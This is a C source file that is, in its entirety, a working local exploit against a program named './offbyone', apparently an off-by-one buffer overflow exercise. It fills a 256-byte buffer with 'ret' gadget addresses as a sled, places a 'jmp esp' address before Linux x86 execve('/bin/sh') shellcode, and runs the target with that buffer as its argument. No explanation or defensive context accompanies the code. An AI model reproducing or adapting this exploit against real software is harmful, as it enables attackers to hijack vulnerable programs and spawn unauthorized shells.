#include <stdio.h>
#include <string.h>
#include <unistd.h>


/* Pointer to ret (used as nop) */
unsigned char *ret = "\xed\x84\x04\x08";
/* Pointer to jmp esp */
unsigned char *jump = "\x9e\x84\x04\x08";

/* Shellcode Linux x86 execve("/bin/sh", NULL, NULL) */
const char shellcode[] =
            "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
            "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
            "\x53\x89\xe1\x99\xb0\x0b\xcd\x80";


int main(int argc, const char *argv[])
{
   int x;
   unsigned char payload[256];

   char *args[] = { "./offbyone", payload, NULL };
   
   /* Fill the payload with the pointer to ret (simulate nop) */
   for (x=0; x<sizeof(payload); x+=4)
      memcpy(&payload[x], ret, 4);

   /* Copy the shellcode at the end and align it to 4 bytes */
   x = sizeof(payload) - (sizeof(shellcode) + (4 - (sizeof(shellcode)%4)));
   memcpy(&payload[x], shellcode, sizeof(shellcode)-1);

   /* Copy the jmp esp pointer just before the shellcode */
   memcpy(&payload[x-4], jump, 4);

   //write(1, payload, sizeof(payload));
   execve(args[0], args, NULL); 
   
   return 0;
}

